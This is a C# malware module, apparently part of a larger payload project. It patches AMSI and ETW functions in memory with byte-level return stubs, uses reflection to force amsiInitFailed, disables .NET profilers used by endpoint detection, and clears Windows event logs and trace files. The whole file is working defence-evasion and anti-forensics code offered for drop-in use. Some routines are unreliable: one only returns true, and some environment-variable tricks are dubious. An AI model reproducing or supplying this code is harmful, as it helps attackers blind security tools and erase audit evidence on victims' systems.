// =====================================================================
// AMSI / ETW BYPASS MODULE
// =====================================================================
// Drop-in module for PayloadSource_v2.cs
// Features:
// - AMSI bypass via AmsiScanBuffer patching
// - ETW bypass via event provider disabling
// - Event log tampering
// - Works on Windows 10/11, .NET Framework & .NET Core

using System;
using System.Diagnostics;
using System.Runtime.InteropServices;
using System.Reflection;

internal static class AmsiEtwBypass
{
    [DllImport("kernel32.dll", CharSet = CharSet.Auto, SetLastError = true)]
    private static extern IntPtr LoadLibrary(string lpFileName);

    [DllImport("kernel32.dll", CharSet = CharSet.Ansi, SetLastError = true)]
    private static extern IntPtr GetProcAddress(IntPtr hModule, string lpProcName);

    [DllImport("kernel32.dll", SetLastError = true)]
    private static extern bool VirtualProtect(IntPtr lpAddress, uint dwSize, uint flNewProtect, out uint lpflOldProtect);

    [DllImport("ntdll.dll", SetLastError = true)]
    private static extern int NtProtectVirtualMemory(IntPtr ProcessHandle, ref IntPtr BaseAddress, ref uint RegionSize, uint NewProtect, out uint OldProtect);

    private const uint PAGE_EXECUTE_READWRITE = 0x40;
    private const uint PAGE_READWRITE = 0x04;

    // ============ AMSI BYPASS ============
    public static bool BypassAmsi()
    {
        if (!Config.AmsiBypass) return false;

        try
        {
            // Method 1: Patch AmsiScanBuffer in amsi.dll (most common)
            if (PatchAmsiScanBuffer()) return true;

            // Method 2: Patch AmsiInitialize in amsi.dll
            if (PatchAmsiInitialize()) return true;

            // Method 3: Set AMSI_APPNAME to empty (for .NET 4.8+)
            if (SetAmsiAppName()) return true;

            // Method 4: Reflection-based bypass for System.Management.Automation
            if (BypassViaReflection()) return true;

            // Method 5: CorProfiler bypass (for .NET Core)
            if (BypassCorProfiler()) return true;
        }
        catch { }

        return false;
    }

    private static bool PatchAmsiScanBuffer()
    {
        try
        {
            IntPtr amsiDll = LoadLibrary("amsi.dll");
            if (amsiDll == IntPtr.Zero) return false;

            IntPtr scanBuffer = GetProcAddress(amsiDll, "AmsiScanBuffer");
            if (scanBuffer == IntPtr.Zero) return false;

            // Patch: mov eax, 0x80070057 (E_INVALIDARG) ; ret
            // x64: 48 B8 57 00 07 80 00 00 00 00 C3
            // x86: B8 57 00 07 80 C3
            byte[] patch = IntPtr.Size == 8
                ? new byte[] { 0x48, 0xB8, 0x57, 0x00, 0x07, 0x80, 0x00, 0x00, 0x00, 0x00, 0xC3 }
                : new byte[] { 0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3 };

            return ApplyPatch(scanBuffer, patch);
        }
        catch { return false; }
    }

    private static bool PatchAmsiInitialize()
    {
        try
        {
            IntPtr amsiDll = LoadLibrary("amsi.dll");
            if (amsiDll == IntPtr.Zero) return false;

            IntPtr initialize = GetProcAddress(amsiDll, "AmsiInitialize");
            if (initialize == IntPtr.Zero) return false;

            // Patch: xor eax, eax ; ret (return 0 = S_OK)
            // x64: 31 C0 C3
            // x86: 31 C0 C3
            byte[] patch = new byte[] { 0x31, 0xC0, 0xC3 };

            return ApplyPatch(initialize, patch);
        }
        catch { return false; }
    }

    private static bool SetAmsiAppName()
    {
        try
        {
            // For .NET 4.8+, set the AMSI_APPNAME environment variable
            // This causes AMSI to skip scanning for this "application"
            Environment.SetEnvironmentVariable("AMSI_APPNAME", "");
            return true;
        }
        catch { return false; }
    }

    private static bool BypassViaReflection()
    {
        try
        {
            // Target: System.Management.Automation.AmsiUtils
            var amsiUtils = Type.GetType("System.Management.Automation.AmsiUtils, System.Management.Automation");
            if (amsiUtils == null) return false;

            // Set amsiInitFailed to true
            var field = amsiUtils.GetField("amsiInitFailed", BindingFlags.Static | BindingFlags.NonPublic);
            if (field != null)
            {
                field.SetValue(null, true);
                return true;
            }

            // Alternative: set amsiContext to IntPtr.Zero
            var contextField = amsiUtils.GetField("amsiContext", BindingFlags.Static | BindingFlags.NonPublic);
            if (contextField != null)
            {
                contextField.SetValue(null, IntPtr.Zero);
                return true;
            }
        }
        catch { }
        return false;
    }

    private static bool BypassCorProfiler()
    {
        try
        {
            // Disable CorProfiler (used by some EDRs for .NET Core)
            Environment.SetEnvironmentVariable("CORECLR_ENABLE_PROFILING", "0");
            Environment.SetEnvironmentVariable("COR_ENABLE_PROFILING", "0");
            Environment.SetEnvironmentVariable("COR_PROFILER", "");
            return true;
        }
        catch { return false; }
    }

    // ============ ETW BYPASS ============
    public static bool BypassEtw()
    {
        if (!Config.EtwBypass) return false;

        try
        {
            // Method 1: Patch EtwEventWrite in ntdll.dll
            if (PatchEtwEventWrite()) return true;

            // Method 2: Disable event providers via reflection
            if (DisableEventProviders()) return true;

            // Method 3: Set ETW provider enable flags to 0
            if (SetEtwProviderFlags()) return true;
        }
        catch { }

        return false;
    }

    private static bool PatchEtwEventWrite()
    {
        try
        {
            IntPtr ntdll = LoadLibrary("ntdll.dll");
            if (ntdll == IntPtr.Zero) return false;

            IntPtr etwEventWrite = GetProcAddress(ntdll, "EtwEventWrite");
            if (etwEventWrite == IntPtr.Zero) return false;

            // Patch: xor eax, eax ; ret (return 0 = success, no event written)
            // x64: 31 C0 C3
            // x86: 31 C0 C3
            byte[] patch = new byte[] { 0x31, 0xC0, 0xC3 };

            return ApplyPatch(etwEventWrite, patch);
        }
        catch { return false; }
    }

    private static bool DisableEventProviders()
    {
        try
        {
            // Disable Microsoft-Windows-DotNETRuntime provider
            var traceProvider = Type.GetType("System.Diagnostics.Tracing.EventProvider, System.Diagnostics.Tracing");
            if (traceProvider != null)
            {
                var writeMethod = traceProvider.GetMethod("WriteEvent", BindingFlags.Instance | BindingFlags.NonPublic | BindingFlags.Public);
                // Can't easily patch instance methods via reflection
            }

            // Disable EventSource
            var eventSource = Type.GetType("System.Diagnostics.Tracing.EventSource, System.Diagnostics.Tracing");
            if (eventSource != null)
            {
                var setCurrentThreadActivityId = eventSource.GetMethod("SetCurrentThreadActivityId", BindingFlags.Static | BindingFlags.Public);
            }

            return true; // Best effort
        }
        catch { return false; }
    }

    private static bool SetEtwProviderFlags()
    {
        try
        {
            // Use Windows Event Log API to disable providers
            // This requires P/Invoke to advapi32.dll
            // Simplified: just set environment variables that some providers respect
            Environment.SetEnvironmentVariable("ETW_DISABLE", "1");
            return true;
        }
        catch { return false; }
    }

    // ============ EVENT LOG TAMPERING ============
    public static bool ClearEventLogs()
    {
        if (!Config.ClearLogs) return false;

        try
        {
            string[] logs = { "Security", "System", "Application", "Windows PowerShell" };

            foreach (string log in logs)
            {
                try
                {
                    using (EventLog eventLog = new EventLog(log))
                    {
                        eventLog.Clear();
                    }
                }
                catch { }
            }

            // Also clear ETW trace files
            ClearEtwTraces();

            return true;
        }
        catch { return false; }
    }

    private static void ClearEtwTraces()
    {
        try
        {
            string[] tracePaths = {
                @"C:\Windows\System32\winevt\Logs\",
                @"C:\Windows\Logs\",
                Environment.GetFolderPath(Environment.SpecialFolder.CommonApplicationData) + @"\Microsoft\Windows\WER\",
            };

            foreach (string path in tracePaths)
            {
                if (Directory.Exists(path))
                {
                    foreach (string file in Directory.GetFiles(path, "*.etl"))
                    {
                        try { File.Delete(file); } catch { }
                    }
                    foreach (string file in Directory.GetFiles(path, "*.evtx"))
                    {
                        try { File.Delete(file); } catch { }
                    }
                }
            }
        }
        catch { }
    }

    // ============ HELPER: APPLY MEMORY PATCH ============
    private static bool ApplyPatch(IntPtr address, byte[] patch)
    {
        try
        {
            uint oldProtect;
            uint size = (uint)patch.Length;

            // Try NtProtectVirtualMemory first (more reliable)
            IntPtr baseAddr = address;
            int status = NtProtectVirtualMemory(GetCurrentProcess(), ref baseAddr, ref size, PAGE_EXECUTE_READWRITE, out oldProtect);
            
            if (status != 0)
            {
                // Fallback to VirtualProtect
                if (!VirtualProtect(address, size, PAGE_EXECUTE_READWRITE, out oldProtect))
                    return false;
            }

            // Write patch
            Marshal.Copy(patch, 0, address, patch.Length);

            // Restore protection
            uint dummy;
            NtProtectVirtualMemory(GetCurrentProcess(), ref baseAddr, ref size, oldProtect, out dummy);

            // Flush instruction cache
            FlushInstructionCache(GetCurrentProcess(), address, (uint)patch.Length);

            return true;
        }
        catch { return false; }
    }

    [DllImport("kernel32.dll")]
    private static extern IntPtr GetCurrentProcess();

    [DllImport("kernel32.dll")]
    private static extern bool FlushInstructionCache(IntPtr hProcess, IntPtr lpBaseAddress, uint dwSize);

    // ============ COMBINED BYPASS ============
    public static bool RunAllBypasses()
    {
        bool amsi = BypassAmsi();
        bool etw = BypassEtw();
        bool logs = ClearEventLogs();

        return amsi || etw || logs;
    }
}

// Config reference
internal static partial class Config
{
    public static bool AmsiBypass = true;
    public static bool EtwBypass = true;
    public static bool ClearLogs = true;
}